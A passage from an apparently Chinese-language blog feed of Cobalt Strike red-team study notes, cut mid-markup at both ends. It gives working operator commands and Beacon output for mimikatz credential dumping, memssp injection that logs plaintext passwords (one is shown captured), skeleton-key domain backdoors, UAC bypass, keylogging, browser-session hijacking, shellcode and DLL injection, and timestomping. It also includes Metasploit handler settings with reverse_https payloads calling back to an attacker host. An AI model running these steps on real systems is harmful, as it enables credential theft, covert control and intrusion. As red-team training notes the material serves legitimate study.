Credentials</code>下可以查看到<code>hashdump</code>与<code>mimikatz</code>获取的数据。</p><h1 id="0x03-Mimikatz"><a href="#0x03-Mimikatz" class="headerlink" title="0x03 Mimikatz"></a>0x03 Mimikatz</h1><p>在 Beacon 中集成了 mimikatz ，mimikatz 执行命令有三种形式：</p><ul><li><p><code>mimikatz [module::command] &lt;args&gt;</code></p><p>运行 mimikatz 命令</p></li><li><p><code>mimikatz [!module::command] &lt;args&gt;</code></p><p>强制提升到 SYSTEM 权限再运行命令，因为一些命令只有在 SYSTEM 身份下才能被运行。</p></li></ul><ul><li><p><code>mimikatz [@module::command] &lt;args&gt;</code></p><p>使用当前 Beacon 的访问令牌运行 mimikatz 命令</p></li></ul><p>下面是一些<code>mimikatz</code>命令。</p><ul><li><p><code>!lsadump::cache</code></p><p>获取缓存凭证，默认情况下 Windows 会缓存最近10个密码哈希</p></li><li><p><code>!lsadump::sam</code></p><p>获取本地账户密码哈希，该命令与 hashdump 比较类似</p></li><li><p><code>misc::cmd</code></p><p>如果注册表中禁用了 CMD ，就重新启用它</p></li><li><p><code>!misc::memssp</code></p><p>注入恶意的 Windows SSP 来记录本地身份验证凭据，这个凭证存储在“C:\windows\system32\mimilsa.log”中</p></li><li><p><code>misc::skeleton</code></p><p>该命令仅限域内使用。该命令会给所有域内用户添加一个相同的密码，域内所有的用户都可以使用这个密码进行认证，同时原始密码也可以使用,其原理是对 lsass.exe 进行注入，重启后会失效。</p></li><li><p><code>process::suspend [pid]</code></p><p>挂起某个进程，但是不结束它</p></li><li><p><code>process::resume [pid]</code></p><p>恢复挂起的进程</p></li></ul><p>以上的这些只是<code>mimikatz</code>能做事情的一小部分，下面看看<code>!misc::memssp</code>的使用。</p><pre class="line-numbers language-none"><code class="language-none">mimikatz !misc::memsspcd C:\Windows\system32shell dir mimilsa.logshell type mimilsa.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>详细运行过程：</p><p>首先运行<code>mimikatz !misc::memssp</code></p><pre class="line-numbers language-none"><code class="language-none">beacon&gt; mimikatz !misc::memssp[*] Tasked beacon to run mimikatz&#39;s !misc::memssp command[+] host called home, sent: 1006151 bytes[+] received output:Injected &#x3D;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来来到<code>C:\Windows\system32</code>目录</p><pre class="line-numbers language-none"><code class="language-none">beacon&gt; cd C:\Windows\system32[*] cd C:\Windows\system32[+] host called home, sent: 27 bytesbeacon&gt; shell dir mimilsa.log[*] Tasked beacon to run: dir mimilsa.log[+] host called home, sent: 46 bytes[+] received output: 驱动器 C 中的卷没有标签。 卷的序列号是 BE29-9C84 C:\Windows\system32 的目录2020&#x2F;07&#x2F;23  21:47                24 mimilsa.log               1 个文件             24 字节               0 个目录 17,394,728,960 可用字节<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到是存在<code>mimilsa.log</code>文件的，此时待目标主机重新登录，比如电脑锁屏后用户进行登录。</p><p>查看<code>mimilsa.log</code>文件内容。</p><pre class="line-numbers language-none"><code class="language-none">beacon&gt; shell type mimilsa.log[*] Tasked beacon to run: type mimilsa.log[+] host called home, sent: 47 bytes[+] received output:[00000000:000003e5] \[00000000:002b99a7] WIN-75F8PRJM4TP\AdministratorPassword123!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功获取到当前登录用户的明文密码。</p><blockquote><p>参考链接：</p><p><a href="https://www.anquanke.com/post/id/156299">https://www.anquanke.com/post/id/156299</a></p><p><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p><a href="https://my.oschina.net/u/4300698/blog/3382230">https://my.oschina.net/u/4300698/blog/3382230</a></p><p><a href="https://www.freebuf.com/articles/web/231892.html">https://www.freebuf.com/articles/web/231892.html</a></p><p><a href="https://blog.csdn.net/github_35186068/article/details/80518681">https://blog.csdn.net/github_35186068/article/details/80518681</a></p><p><a href="https://wooyun.js.org/drops/Powershell%20%E6%8F%90%E6%9D%83%E6%A1%86%E6%9E%B6-Powerup.html">https://wooyun.js.org/drops/Powershell%20%E6%8F%90%E6%9D%83%E6%A1%86%E6%9E%B6-Powerup.html</a></p><p><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CS学习笔记】13、bypassuac</title>
      <link href="//200419-150552.html"/>
      <url>//200419-150552.html</url>
      
        <content type="html"><![CDATA[<p>Bypass UAC 有两个步骤，分别是：</p><p>1、利用 UAC 漏洞来获取一个特权文件副本</p><p>2、使用 DLL 劫持进行代码执行</p><p>首先使用<code>shell whoami /groups</code>查看当前上线主机用户的所属组及 UAC 等级</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs13-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>通过返回信息可以看出，当前用户为管理员权限，UAC 等级为中，根据上一节中关于的介绍，此时可以使用<code>bypassuac</code>进行提权。</p><p>首先，右击会话，选择<code>Access --&gt; Elevate</code>，这里选择一个 SMB Beacon，Exploit 选择<code>uac-token-duplication</code>，最后 Launch 即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs13-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>待 Beacon Check in 后，当前用户 UAC 为高权限的会话便会上线了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs13-3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CS学习笔记】12、特权提升</title>
      <link href="//200419-150546.html"/>
      <url>//200419-150546.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-用户账户控制"><a href="#0x00-用户账户控制" class="headerlink" title="0x00 用户账户控制"></a>0x00 用户账户控制</h1><p>自 Windows vista 开始，Windows 系统引进了用户账户控制机制，即 UAC<code>User Account Control</code>机制，UAC 机制在 Win 7中得到了完善。UAC 与 UNIX 中的 sudo 工作机制十分相似，平时用户以普通权限工作，当用户需要执行特权操作时，系统会询问他们是否要提升权限。</p><p>此时系统用户可分为以下三种等级：</p><p>高：管理员权限</p><p>中：一般用户权限</p><p>低：受限制的权限</p><p>使用<code>whoami /groups</code>命令可以看到当前用户所在的组以及权限，使用<code>net localgroup administrators</code>可以查看当前在管理员组里的用户名。</p><h1 id="0x01-提升权限"><a href="#0x01-提升权限" class="headerlink" title="0x01 提升权限"></a>0x01 提升权限</h1><p>当某些操作需要管理员权限，而当前用户权限只有一般用户权限时，就需要提权操作了。</p><p>在 CS 中有以下几种提权操作：</p><p><code>bypassuac</code>：将本地中级管理员权限提升至本地高级管理员权限，适用于Win 7 及以上的系统。</p><p><code>elevate</code>：将任意用户的权限提升至系统权限，适用于2018年11月更新之前的 Win 7 和 Win 10 系统。</p><p><code>getsystem</code>：将本地高级管理员权限提升至系统权限。</p><p><code>runas</code>：使用其他用户的凭证来以其他用户身份运行一个命令，该命令不会返回任何输出。</p><p><code>spawnas</code>：使用其他用户的凭证来以其他用户身份派生一个会话，这个命令派生一个临时的进程并将 payload stage 注入进那个进程。</p><h1 id="0x03-Spawn-As-的使用"><a href="#0x03-Spawn-As-的使用" class="headerlink" title="0x03 Spawn As 的使用"></a>0x03 Spawn As 的使用</h1><p>首先，右击待提权的会话，选择<code>Access --&gt; Spawn As</code>，输入目标系统用户身份信息，其中域信息填写一个“点”代表本地用户，监听器这里选择的 SMB 监听器，之后点击运行就能看到对应的用户上线了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs12-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CS学习笔记】11、用户驱动溢出攻击</title>
      <link href="//200419-150538.html"/>
      <url>//200419-150538.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Beacon 运行任务的方式是以<code>jobs</code>去运行的，比如键盘记录、PowerShell 脚本、端口扫描等，这些任务都是在 beacon check in 之间于后台运行的。</p><p><code>jobs</code>：查看当前 Beacon 中的任务</p><p><code>jobkill</code>：加上任务 ID，对指定任务进行停止</p><h1 id="0x01-屏幕截图和键盘记录"><a href="#0x01-屏幕截图和键盘记录" class="headerlink" title="0x01 屏幕截图和键盘记录"></a>0x01 屏幕截图和键盘记录</h1><h2 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h2><p><code>screenshot</code>：获取屏幕截图，使用<code>screenshot pid</code>来将截屏工具注入到一个 x86 的进程中，使用<code>screenshot pid x64</code>注入到一个 x64 进程中，explorer.exe 是一个好的候选程序。</p><p>使用<code>screenshot [pid] [x86|x64] [time]</code>来请求截屏工具运行指定的秒数，并在每一次 Beacon 连接到团队服务器的时候报告一张屏幕截图，这是查看用户桌面的一种简便方法。要查看截屏的具体信息，通过<code>View --&gt; Screenshots</code>来浏览从所有 Beacon 会话中获取的截屏。</p><h2 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h2><p><code>keylogger</code>：键盘记录器，使用<code>keylogger pid</code>来注入一个 x86 程序。使用<code>keylogger pid x64</code>来注入一个 x64 程序，explorer.exe 是一个好的候选程序。</p><p>使用单独的 keylogger 命令来将键盘记录器注入一个临时程序。键盘记录器会监视从被注入的程序中的键盘记录并将结果报告给 Beacon，直到程序终止或者自己杀死了这个键盘记录后渗透任务。要查看键盘记录的结果，可以到<code>View --&gt; Keystrokes</code>中进行查看。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>除了上述使用命令的方式进行屏幕截图和键盘记录，也可以来到<code>Explore --&gt; Process List</code>下选择要注入的进程，再直接点击屏幕截图或键盘记录的功能按钮。</p><p>从使用上，具体注入那个程序都是可以的，只是注入 explorer.exe 会比较稳定与持久。值得注意的是，多个键盘记录器可能相互冲突，每个桌面会话只应使用一个键盘记录器。</p><h1 id="0x02-浏览器转发"><a href="#0x02-浏览器转发" class="headerlink" title="0x02 浏览器转发"></a>0x02 浏览器转发</h1><p>浏览器转发是指在已经攻击成功的目标中，利用目标的信息登录网站进行会话劫持，但是目前只支持目标正在使用IE浏览器的前提下。关于如何判断当前用户是否使用IE浏览器，则可以通过屏幕截图来判断。如下图中，通过屏幕截图可以看到目标正在使用IE浏览器登陆着当前网站的admin账户。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs11-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>找到目前正在使用IE浏览器的目标后，右击该会话，选择<code>Explore --&gt; Browser Pivot</code>，随后选择要注入的进程，CS 会在它认为可以注入的进程右边显示一个对勾，设置好端口后，点击运行即可。</p><p>此时，在浏览器中配置代理，代理配置为http代理，IP为CS团队服务器IP，端口为刚设置的端口。</p><p>代理配置好后，在浏览器中打开目标当前正在打开的网址，即可绕过登录界面。</p><h1 id="0x03-端口扫描"><a href="#0x03-端口扫描" class="headerlink" title="0x03 端口扫描"></a>0x03 端口扫描</h1><p><code>portscan</code>：进行端口扫描，使用参数为：<code>portscan [targets] [ports] [discovery method]</code>。</p><p>目标发现<code>discovery method</code>有三种方法，分别是：<code>arp、icmp、none</code>，<code>arp</code>方法使用 ARP 请求来发现一个主机是否存活。<code>icmp</code>方法发送一个 ICMP echo 请求来检查一个目标是否存活。<code>none</code>选项让端口扫描工具假设所有的主机都是存活的。</p><p>端口扫描会在 Beacon 和团队服务器通讯的这个过程中不停运行。当它有可以报告的结果，它会把结果发送到 Beacon 控制台。Cobalt Strike 会处理这个信息并使用发现的主机更新目标模型。</p><p>右击 Beacon会话，在<code>Explore --&gt; Port Scan</code>中即可打开端口扫描的图形窗口，CS会自动填充扫描地址，确认扫描地址、端口、扫描方式等无误后，开始扫描即可。扫描结束后，在 target table页面中可看到扫描结果，右击会话，选择 Services 可查看详细的扫描结果。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs11-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CS学习笔记】10、如何管理Payload载荷</title>
      <link href="//200419-150531.html"/>
      <url>//200419-150531.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>到目前为止，已经学过了如何在有漏洞的目标上获取立足点的方法，接下来将继续学习后渗透相关的知识，这一节就来学习学习 beacon 的管理、会话传递等。</p><h1 id="0x01-Beacon-的管理"><a href="#0x01-Beacon-的管理" class="headerlink" title="0x01 Beacon 的管理"></a>0x01 Beacon 的管理</h1><h2 id="Beacon-控制台"><a href="#Beacon-控制台" class="headerlink" title="Beacon 控制台"></a>Beacon 控制台</h2><p>在一个 Beacon 会话上右击 <code>interact</code>（交互）即可打开 Beacon 控制台，如果想对多个会话进行控制，也只需选中多个会话，执行相关功能即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs10-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>在 Beacon 的控制台中的输入与输出之间，是一个状态栏，状态栏上的信息分别是：目标 NetBIOS 名称、用户名、会话PID以及 Beacon 最近一次连接到 CS 团队服务器的时间。</p><p>Beacon 控制台是在使用 CS 的过程中，很经常用到的功能，向 Beacon 发出的每个命令，都可以在这里看到，如果队友发送了消息，在 Beacon 控制台同样能看到，消息前还会显示队友的名称。</p><h2 id="Beacon-菜单"><a href="#Beacon-菜单" class="headerlink" title="Beacon 菜单"></a>Beacon 菜单</h2><p>Access：包含了一些对凭据的操作及提权的选项</p><p>Explore：包含了信息探测与目标交互的选项</p><p>Pivoting：包含了一些设置代理隧道的选项</p><p>Session：包含了对当前 Beacon 会话管理的选项</p><h2 id="Beacon-命令"><a href="#Beacon-命令" class="headerlink" title="Beacon 命令"></a>Beacon 命令</h2><p>help：查看 Beacon 命令的帮助信息。使用 help + 待查看帮助的命令可查看该命令的帮助信息。</p><p>clear：清除 Beacon 命令队列。Beacon 是一个异步的 Payload，输入的命令并不会立即执行，而是当 Beacon 连接到团队服务器时再一一执行命令，因此当需要清除队列命令时就可以使用 clear 命令。</p><p>sleep：改变 Beacon 的休眠时间。输入 <code>sleep 30</code>表示休眠30秒；输入<code>sleep 60 50</code>表示，随机睡眠 30秒至60秒，其中30秒 = 60 x 50%；如果输入 <code>sleep 0</code>则表示进入交互模式，任何输入的命令都会被立即执行，当输入一些命令，比如<code>desktop</code>时， Beacon 会自动进入交互模式。</p><p>shell：通过受害主机的 cmd.exe 执行命令。比如运行<code>ipconfig</code>，就需要输入<code>shell ipconfig</code></p><p>run：不使用 cmd.exe 执行命令。该命令也是 run + 命令的形式运行，该命令会将执行结果回显。</p><p>execute：执行命令，但不回显结果。</p><p>cd：切换当前工作目录。</p><p>pwd：查看当前所在目录。</p><p>powershell：通过受害主机的 PowerShell 执行命令。比如想在 PowerShell 下运行 <code>ipconfig</code>，就需要输入<code>powershell ipconfig</code></p><p>powerpick：不使用 powershell.exe 执行 powershell 命令。这个命令依赖于由 Lee Christensen 开发的非托管 PowerShell 技术。powershell 和 powerpick 命令会使用当前令牌（ token ）。</p><p>psinject：将非托管的 PowerShell 注入到一个特定的进程中并从此位置运行命令。</p><p>powershell-import：导入 PowerShell 脚本到 Beacon 中。直接运行 powershell-import + 脚本文件路径即可，但是这个脚本导入命令一次仅能保留一个 PowerShell 脚本，再导入一个新脚本的时候，上一个脚本就被覆盖了，因此可以通过导入一个空文件来清空 Beacon 中导入的脚本。</p><p>powershell get-help：获取 PowerShell 命令的相关帮助信息。比如想获取 PowerShell 下 get-process 命令的帮助，就需要输入<code>powershell get-help  get-process</code></p><p>execute-assembly：将一个本地的 .NET 可执行文件作为 Beacon 的后渗透任务来运行。</p><p>setenv：设置一个环境变量。</p><h1 id="0x02-会话传递"><a href="#0x02-会话传递" class="headerlink" title="0x02 会话传递"></a>0x02 会话传递</h1><h2 id="会话传递相关命令"><a href="#会话传递相关命令" class="headerlink" title="会话传递相关命令"></a>会话传递相关命令</h2><p>Beacon 被设计的最初目的就是向其他的 CS 监听器传递会话。</p><p><code>spawn</code>：进行会话的传递，也可直接右击会话选择<code>spawn</code>命令进行会话的选择。默认情况下，<code>spawn</code>命令会在 rundll32.exe 中派生一个会话。为了更好的隐蔽性，可以找到更合适的程序（如 Internet Explorer） 并使用<code>spawnto</code>命令来说明在派生新会话时候会使用 Beacon 中的哪个程序。</p><p><code>spawnto</code>：该命令会要求指明架构（x86 还是 x64）和用于派生会话的程序的完整路径。单独输入<code>spawnto</code>命令然后按 enter 会指示 Beacon 恢复至其默认行为。</p><p><code>inject</code>：输入<code>inject + 进程 id + 监听器名</code>来把一个会话注入一个特定的进程中。使用 ps 命令来获取一个当前系统上的进程列表。使用<code>inject [pid] x64</code>来将一个64位 Beacon 注入到一个 64位进程中。</p><p><code>spawn</code>和<code>inject</code>命令都将一个 payload stage 注入进内存中。如果 payload stage 是 HTTP、HTTPS 或 DNS Beacon 并且它无法连接到你，那么将看不到一个会话。如果 payload stage 是一个绑定的 TCP 或 SMB 的 Beacon，这些命令会自动地尝试连接到并控制这些 payload。</p><p><code>dllinject</code>：<code>dllinject + [pid]</code>来将一个反射性 DLL 注入到一个进程中。</p><p><code>shinject</code>：使用<code>shinject [pid] [架构] [/路径/.../file.bin]</code>命令来从一个本地文件中注入 shellcode 到一个目标上的进程中。</p><p><code>shspawn</code>：使用<code>shspawn [架构] [/路径/.../file.bin]</code>命令会先派生一个新进程（这个新进程是 spawn to 命令指定的可执行文件），然后把指定的 shellcode 文件（ file.bin ）注入到这个进程中。</p><p><code>dllload</code>：使用<code>dllload [pid] [c:\路径\...\file.dll]</code>来在另一个进程中加载磁盘上的 DLL文件。</p><h2 id="会话传递使用场景"><a href="#会话传递使用场景" class="headerlink" title="会话传递使用场景"></a>会话传递使用场景</h2><p>1、将当前会话传递至其他CS团队服务器中，直接右击<code>spawn</code>选择要传递的监听器即可。</p><p>2、将当前会话传递至MSF中，这里简单做一下演示。</p><p>首先，在MSF中，为攻击载荷新建一个payload</p><pre class="line-numbers language-none"><code class="language-none">msf5 &gt; use exploit&#x2F;multi&#x2F;handlermsf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_httpsmsf5 exploit(multi&#x2F;handler) &gt; set lhost 192.168.175.156msf5 exploit(multi&#x2F;handler) &gt; set lport 443msf5 exploit(multi&#x2F;handler) &gt; exploit -j<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>随后，在CS中新建一个外部<code>Foreign</code>监听器，这里设置的监听IP与端口和MSF中的一致即可，随后在CS中利用<code>spawn</code>选择刚新建的外部监听器，MSF中即可返回会话。</p><h1 id="0x03-文件系统"><a href="#0x03-文件系统" class="headerlink" title="0x03 文件系统"></a>0x03 文件系统</h1><p>浏览会话系统文件位置在右击会话处，选择 <code>Explore --&gt; File Browser</code>即可打开。在这里可以对当前会话下的文件进行浏览、上传、下载、删除等操作。</p><p>在进行文件浏览时，如果 beacon 设置的 sleep 值较高，CS会因此而变得响应比较慢。</p><p>彩色文件夹表示该文件夹的内容位于此文件浏览器的缓存中；深灰色的文件夹表示该文件夹的内容不在此文件浏览器缓存中。</p><h1 id="0x04-文件下载"><a href="#0x04-文件下载" class="headerlink" title="0x04 文件下载"></a>0x04 文件下载</h1><p><code>download</code>：下载请求的文件。Beacon 会下载它的任务要求获取的每一个文件的固定大小的块。这个块的大小取决于 Beacon 当前的数据通道。HTTP 和 HTTPS 通道会拉取 512kb 的数据块。</p><p><code>downloads</code>：查看当前 Beacon 正在进行的文件下载列表。</p><p><code>cancel</code>：该命令加上一个文件名来取消正在进行的一个下载任务。也可以在 cancel 命令中使用通配符来一次取消多个文件下载任务。</p><p>下载文件都将下载到CS团队服务器中，在<code>View --&gt; Download</code>下可看到下载文件的记录，选中文件后使用<code>Sync Files</code>即可将文件下载到本地。</p><h1 id="0x05-文件上传"><a href="#0x05-文件上传" class="headerlink" title="0x05 文件上传"></a>0x05 文件上传</h1><p><code>upload</code>：上传一个文件到目标主机上。</p><p><code>timestomp</code>：将一个文件的修改属性访问属性和创建时间数据与另一个文件相匹配。当上传一个文件时，有时会想改变此文件的时间戳来使其混入同一文件夹下的其他文件中，使用timestomp 命令就可以完成此工作。</p><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CS学习笔记】9、Metasploit框架</title>
      <link href="//200419-150524.html"/>
      <url>//200419-150524.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-客户端的漏洞利用"><a href="#0x00-客户端的漏洞利用" class="headerlink" title="0x00 客户端的漏洞利用"></a>0x00 客户端的漏洞利用</h1><p>如果想使用MSF对目标进行漏洞利用，再通过这个漏洞来传输Beacon的话，也是可以的。</p><p>1、首先在MSF上选择攻击模块</p><p>2、接着在MSF上设置Payload为<code>windows/meterpreter/reverse_http</code>或者<code>windows/meterpreter/reverse_https</code>，这么做是因为CS的Beacon与MSF的分阶段协议是相兼容的。</p><p>3、之后在MSF中设置Payload的LHOST、LPORT为CS中Beacon的监听器IP及端口。</p><p>4、然后设置 <code>DisablePayloadHandler</code> 为 True，此选项会让 MSF 避免在其内起一个 handler 来服务你的 payload 连接，也就是告诉MSF说我们已经建立了监听器，不必再新建监听器了。</p><p>5、再设置 <code>PrependMigrate</code> 为 True，此选项让 MSF 前置 shellcode 在另一个进程中运行 payload stager。如果被利用的应用程序崩溃或被用户关闭，这会帮助 Beacon 会话存活。</p><p>6、最后运行<code>exploit -j</code>，-j 是指作为job开始运行，即在后台运行。</p><h1 id="0x01-操作"><a href="#0x01-操作" class="headerlink" title="0x01 操作"></a>0x01 操作</h1><h2 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h2><p>在CS中新建一个HTTP Beacon，创建过程不再赘述，具体操作过程可参见之前第5节的学习笔记。</p><h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><p>1、在MSF中选择攻击模块，根据教程这里选择的<code>adobe_flash_hacking_team_uaf</code>模块，不过个人感觉现在这个模块已经不太能被利用成功了。</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;browser&#x2F;adobe_flash_hacking_team_uaf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2、接着配置payload，这里选择revese_http payload</p><pre class="line-numbers language-none"><code class="language-none">set payload windows&#x2F;meterpreter&#x2F;revese_httpset LHOST cs_server_ipset LPORT 80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>3、之后，配置<code>DisablePayloadHandler</code>、<code>PrependMigrate</code>为 True</p><pre class="line-numbers language-none"><code class="language-none">set DisablePayloadHandler Trueset PrependMigrate True<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>4、最后，开始攻击。</p><pre class="line-numbers language-none"><code class="language-none">exploit -j<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs9-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="伪装——克隆网站"><a href="#伪装——克隆网站" class="headerlink" 